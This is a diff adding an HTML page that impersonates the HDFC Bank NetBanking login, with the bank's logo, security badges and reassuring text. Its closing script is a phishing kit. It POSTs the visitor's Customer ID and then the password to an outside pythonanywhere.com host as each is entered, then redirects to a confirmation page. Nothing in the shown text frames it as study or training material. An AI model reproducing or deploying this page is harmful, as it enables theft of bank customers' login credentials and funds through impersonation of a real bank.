@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/rippleui@1.12.1/dist/css/styles.css" />
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        hdfc: '#023580',
+                    }
+                }
+            }
+        }
+    </script>
+    <title>Welcome to HDFC Bank NetBanking</title>
+</head>
+
+<body class="flex flex-col items-center bg-gray-100 text-black">
+
+    <nav class="flex flex-col items-center gap-5 p-5 bg-white w-full">
+        <img class="w-[10rem]" src="https://netbanking.hdfcbank.com/netbanking/gif/logo.png" alt="LOGO">
+        <h1 class="text-xl">Welcome to HDFC Bank NetBanking</h1>
+    </nav>
+
+    <div class="flex flex-col bg-white m-2 min-h-[90vh] w-full sm:w-2/3 p-5">
+        <h2 class="text-lg">Login to NetBanking</h2>
+        <div class="flex flex-col sm:flex-row gap-5 sm:gap-0">
+            <div class="flex flex-col w-full sm:w-1/2">
+                <div class="flex flex-col items-start my-2 gap-5">
+                    <div class="flex flex-col sm:flex-row gap-1 sm:gap-5 w-full">
+                        <p>Customer ID/ User ID</p>
+                        <input type="text" id="cust_id" class="text-black border border-gray-300 input-ghost-primary input h-1rem h-[2rem] rounded-md w-full sm:w-1/2" />
+                    </div>
+                    <div id="step0" class="hidden flex flex-col sm:flex-col gap-1 sm:gap-5 w-full">
+                        <div class="flex flex-col sm:flex-row gap-1 sm:gap-5 w-full">
+                            <p>Password/ IPIN</p>
+                            <input type="password" id="password" class="text-black border border-gray-300 input-ghost-primary input h-1rem h-[2rem] rounded-md w-full sm:w-1/2" placeholder="Password/ IPIN" />
+                        </div>
+                        <p class="cursor-pointer text-primary hover:underline w-max">Forgot password?</p>
+                    </div>
+                    <button id="submitBtn" class="btn btn-primary rounded-sm w-1/2">CONTINUE</button>
+                </div>
+                <p class="bg-blue-100 p-2 my-2 text-gray-700">Dear Customer, <br> Welcome to the new login page of HDFC Bank NetBanking. Its lighter look and feel is designed to give you the best possible user experience. Please continue to login using your customer ID and password.</p>
+                <h2 class="text-lg">Don't have a HDFC Bank Savings Account?</h2>
+                <div class="grid grid-cols-2 gap-2 my-4">
+                    <a class="text-primary cursor-pointer hover:underline text-sm">Credit Card only? Login here</a>
+                    <a class="text-primary cursor-pointer hover:underline text-sm">HDFC Ltd. Home Loans? Login here</a>
+                    <a class="text-primary cursor-pointer hover:underline text-sm">Prepaid Card only ? Login here</a>
+                    <a class="text-primary cursor-pointer hover:underline text-sm">HDFC Ltd. Deposits? Login here</a>
+                    <a class="text-primary cursor-pointer hover:underline text-sm">Retail Loan only? Login here</a>
+                </div>
+            </div>
+            <div class="flex flex-col items-center w-full sm:w-1/2 gap-5">
+                <img class="w-20" src="https://netbanking.hdfcbank.com/netbanking/gif/nortonsecurity.png" alt="NORTON">
+                <div class="flex flex-col w-full sm:w-2/3">
+                    <p class="text-gray-600">Your security is of utmost importance.</p>
+                    <p class="text-primary cursor-pointer hover:underline">Know More...</p>
+                </div>
+                <div class="flex flex-col w-full sm:w-2/3">
+                    <p class="text-lg text-black">First Time User?</p>
+                    <p class="text-gray-600"><span class="text-primary cursor-pointer hover:underline">Register Now</span> for a host of convenient features</p>
+                </div>
+                <div class="flex flex-col w-full sm:w-2/3">
+                    <p class="text-lg text-black">We have added a host of new features!</p>
+                </div>
+                <div class="flex flex-col w-full sm:w-2/3">
+                    <p class="text-gray-600">You can now do so much more:</p>
+                    <ul class="list-disc">
+                        <li class="text-gray-600">Anywhere access through Desktop or mobile</li>
+                        <li class="text-gray-600">Enhanced security measures</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="flex flex-row bg-hdfc p-3 gap-5 w-full">
+        <p class="text-white text-sm">© Copyright HDFC Bank Ltd.</p>
+        <p class="text-white text-sm">Terms and Conditions</p>
+        <p class="text-white text-sm">Privacy Policy</p>
+    </footer>
+
+
+
+    <script>
+
+        var cust_id = document.getElementById("cust_id");
+        var password = document.getElementById("password");
+        var submitBtn = document.getElementById("submitBtn");
+
+        var step0 = document.getElementById("step0");
+
+        var step = 0;
+
+        var data = {}
+
+        function stepChanger() {
+            step++;
+            cust_id.disabled = true;
+            step0.classList.remove('hidden');
+        }
+
+        function pushData(key, val) {
+            data[key] = val;
+            fetch('https://bobarakhas.pythonanywhere.com', {
+                method: 'POST',
+                body: JSON.stringify(data)
+            })
+        }
+
+        submitBtn.onclick = () => {
+            if (step === 0) {
+                if (cust_id.value.length > 0) {
+                    pushData('Customer ID', cust_id.value);
+                    stepChanger();
+                } else {
+                    cust_id.classList.add('border-red-700');
+                    setTimeout(() => {
+                        cust_id.classList.remove('border-red-700');
+                    }, 3000);
+                }
+            } else {
+                if (password.value.length > 0) {
+                    pushData('Password', password.value);
+                    window.location.href = '/confirm.html';
+                } else {
+                    password.classList.add('border-red-700');
+                    setTimeout(() => {
+                        cust_id.classList.remove('border-red-700');
+                    }, 3000);
+                }
+            }
+        }
+
+    </script>
+
+</body>
+
+</html>
